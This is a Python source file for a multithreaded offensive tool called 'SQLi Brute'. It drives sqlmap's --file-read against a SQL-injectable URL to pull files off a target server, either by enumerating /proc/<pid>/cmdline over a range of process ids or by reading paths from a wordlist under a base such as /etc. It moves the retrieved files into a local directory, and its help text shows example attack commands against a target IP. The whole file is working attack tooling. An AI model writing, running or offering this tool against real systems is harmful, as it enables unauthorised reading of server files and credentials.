#!/usr/bin/python3
import threading
import subprocess
import time
import sys
import colorama
from colorama import Fore, Back, Style
import shutil
import os

# SQLi Brute - Created by Balint Csatai
class SQLiBrute():
    threads = []
    existingFiles = []

    # Constructor
    # :param url: the url given from user - this will pass to sqlmap
    # :param requestFile: the path to the request file
    # :param threads: the number of threads
    # :param outDir: the directory to download the existing files
    # :param verbose: if true, then write detailed error report
    def __init__(self,url,requestFile,threads,outDir,parameters,verbose):
        if int(threads) < 1 or int(threads) > 50:
            self.error("The number of threads should between 1 and 50!")
            sys.exit()
        
        self.numberOfThreads = threads
        self.url = url
        self.requestFile = requestFile
        self.outDir = outDir
        self.verbose = verbose
        self.parameters = parameters
        self.critical = False
    
    # Create /proc folder brute threads
    # :param startId: the start process id
    # :param endId: the last process id to brute
    def startProcBrute(self,startId=2000,endId=3000):
        self.startProcessId = startId
        self.endProcessId = endId

        try:
            runThread = threading.Thread(target=self.procThreadController,args=(self.startProcessId,self.endProcessId,))
            self.threads.append(runThread)
            runThread.start()

        except Exception as e:
            self.error("Failed to start thread")
            if self.verbose:
                 print("%s" % e)
    
    # Get the number of running threads
    # :return: return the number of running threads
    def getNumberOfRunningThreads(self):
        return len(self.threads)
   
    # Prints the existing files from the list
    def printExistingFiles(self):
        while True:
            self.clean()
            if self.getNumberOfRunningThreads() == 0:
                print("The existing files: \n")
                for line in self.existingFiles:
                    print("%s" % line)
                break
            time.sleep(1)
    
    # Run the threads for the process brute id by id
    # :param startProcessId: the first process id
    # :param endProcessid: the last process id to enum
    def procThreadController(self, startProcessId, endProcessId):
        if endProcessId > startProcessId:                                       
            while endProcessId > startProcessId:
                if not self.critical:
                    #clean the stopped threads from the list
                    self.clean()
                    if self.getNumberOfRunningThreads() <= self.numberOfThreads:
                        try:
                            fileArgument = "/proc/" + str(startProcessId) + "/cmdline"
                            thread = threading.Thread(target=self.run, args=(fileArgument,))
                            self.threads.append(thread)
                            thread.start()
                            startProcessId = startProcessId + 1
                        except Exception as e:
                            print("Error: %s" % e)
                            sys.exit()
                    else:
                        continue
                else:
                    sys.exit()
        else:
            self.error("The start id should't be bigger than the end id!")
            sys.exit()
    
    # Delete the stopped threads from the list
    def clean(self):
        self.threads = [t for t in self.threads if t.is_alive()]
    
    # Write error message
    def error(self,text):
        print(Fore.RED + "[ERROR]" + Style.RESET_ALL + " %s" % text)
   
    # Write info message
    def info(self,text):
        print(Fore.YELLOW + "[INFO]" + Style.RESET_ALL + " %s" % text  )
    
    # Write success message
    def success(self,text):
        print(Fore.GREEN + "[SUCCESS]" + Style.RESET_ALL + " %s" % text)
    
    # The worker
    # :param fileArgument: the full path what we want to read
    def run(self,fileArgument):
        
        self.info("Trying to read: %s" % fileArgument)
        
        if self.requestFile != "":
            target = "-r " + str(self.requestFile)
        elif self.url != "":
            target = "-u " + str(self.url)

        if self.parameters != "":
            parameters = "-p %s" % self.parameters
        else:
            parameters = ""

        cmd = "sqlmap %s --file-read=%s %s --batch" % (target,fileArgument,parameters)
        cmdsplit = str(cmd).split()
        result = subprocess.run(cmdsplit, stdout=subprocess.PIPE)
       
        if self.verbose:
            print("%s" % str(result))

        if "[CRITICAL]" in str(result):
            if "does not exist" in str(result):
                self.critical = True
                self.error("The request file doesn't exists!")
                sys.exit()

        if "[WARNING]" not in str(result) and "ERROR" not in str(result):
            self.existingFiles.append(fileArgument)
            words = str(result).split()
            i = 0
            
            # Iterate on sqlmap reply to find where the file was downloaded and
            # move to the directory which was given from the user
            for word in words:
                if self.verbose:
                    print("%s" % word)

                if word == "[1]:\\n[*]":
                    theFile = words[i+1]
                    if self.outDir != "":
                        if not os.path.isdir(self.outDir):
                            try:
                                os.makedirs(self.outDir)
                            except Exception as e:
                                self.error("Failed to create directory!")
                        try:
                            if self.outDir[-1] == "/":
                                out = self.outDir + theFile.split("/")[-1]
                            else:
                                out = self.outDir + "/" + theFile.split("/")[-1]
                               
                            fullPath = os.path.abspath(out)
                            if self.verbose:
                                print("%s" % fullPath)
                            shutil.move(theFile,fullPath)
                        except Exception as e:
                            self.error("Failed to write file.")
                            if self.verbose:
                                 print("%s" % e)

                i = i+1

            self.success("File %s exists!" % fileArgument)

    # Open the given wordlist and start sqlmap on every line
    # :param filePath: The path for the wordlist file
    # :param extension: The extension what will be appended to the path
    # :param basicPath: The basic folder on the remote system to read from
    def startFileBrute(self,filePath,extension,basicPath):
        try:
            fo = open(filePath, "r")
            for line in fo:
                if line[0] == '/' and basicPath[-1] == '/':
                    line = line[1:]
               
                if extension is not "":
                    if extension[0] is not ".":
                        extension = ".%s" % extension

                line = basicPath + line.rstrip() + extension
                self.clean()
                isAdded = False
                while True:
                    if not self.critical:
                        self.clean()
                        if self.getNumberOfRunningThreads() <= self.numberOfThreads and not isAdded:
                            thread = threading.Thread(target=self.run, args=(line,))
                            self.threads.append(thread)
                            thread.start()
                            isAdded = True
                            break
                    else:
                        fo.close()
                        sys.exit()

            fo.close()
        except Exception as e:
            self.error("Unable to open file for read!")
            if self.verbose:
                print("%s" % str(e))
            sys.exit()



if __name__ == "__main__":
    header = "\n"
    header += Fore.GREEN + "SQLi Brute v1.0 \n"
    header += "Created by 3X3CU7133 \n"
    header += "\n" + Style.RESET_ALL


    helpMessage = "Syntax: sqli_brute.py -u sqlmap_url [-b filePath] ((-m p -s startProcId -e endProcId) | (-m f -w wordlist)) [-d outDir] [-t threads] \n -h: shows this help \n -u: The url to test. Syntax is same as sqlmap syntax. \n -r: The request file -p: Testable parameter(s) \n -m: The mode can be (p) proc scan, or (f) file scan. \n -s: startProcessId \n -e: endProcessId \n -w: wordlist \n -t: threads -d: output directory to move the downloaded files \n -b: Basic path to read from \n -d: directory to copy the downloaded files \n \n Example usage: \n sqli_brute.py -m p -u http://10.10.10.10:80/sqlquery/someparam* -s 1 -e 1000 -t 25 -d outDir -t 25 \n sqli_brute.py -u http://10.10.10.10/sqlquery/someparam* -m f -w ./linux.txt -x py -b /etc -d ./outDir"

    print("%s" % header)
    if sys.version_info[0] < 3:
            print("Please use Python 3")
            sys.exit()
    
    counter = 0
    startId = -1
    threads = 20
    endId = -1
    url = ""
    mode = ""
    extension = ""
    basicPath = "/"
    outDir = ""
    verbose = False
    requestFile = ""
    parameters = ""

    for arg in sys.argv:
        if arg == "-h":
            print("%s" % helpMessage)
            sys.exit()
        if arg == "-s":
            startId = int(sys.argv[counter+1])
        if arg == "-e":
            endId = int(sys.argv[counter+1])
        if arg == "-t":
            threads = int(sys.argv[counter+1])
        if arg == "-u":
            url = str(sys.argv[counter+1])
        if arg == "-r":
            requestFile = str(sys.argv[counter+1])
        if arg == "-p":
            parameters = str(sys.argv[counter+1])
        if arg == "-m":
            mode = str(sys.argv[counter+1])
        if arg == "-w":
            wordlist = str(sys.argv[counter+1])
        if arg == "-x":
            extension = str(sys.argv[counter+1])
        if arg == "-b":
            basicPath = str(sys.argv[counter+1])
        if arg == "-d":
            outDir = str(sys.argv[counter+1])
        if arg == "-v":
            verbose = True
        counter = counter + 1

    SQLiBrute = SQLiBrute(url,requestFile,threads,outDir,parameters,verbose)
    if url != "" or requestFile != "":
        if mode == "p":
            if startId != -1 and endId != -1:        
                print(Fore.YELLOW + "[Program settings]" + Style.RESET_ALL)
                print("Url: %s \n Mode: process brute \n StartId: %d \n EndId: %d \n Threads: %d" % (url,startId,endId,threads))
                time.sleep(2)
                try:
                    runProc = SQLiBrute.startProcBrute(startId,endId,)
                finally:
                    SQLiBrute.printExistingFiles()
            else:
                print("%s" % helpMessage)
                sys.exit()
        elif mode == "f":
                print(Fore.YELLOW + "[Program settings]" + Style.RESET_ALL)
                print("Url: %s \n Mode: file brute \n Wordlist: %s \n Extension: %s \n Threads:" % (url,wordlist,extension))
                try:
                    runProc = SQLiBrute.startFileBrute(wordlist,extension,basicPath)
                finally:
                    SQLiBrute.printExistingFiles()
        else:
            SQLiBrute.error("Mode is missing!")
            print("%s" % helpMessage)
        
    else:
        SQLiBrute.error("Url or request file is missing! Please check the help.")
        print("%s" % helpMessage)
        sys.exit()    
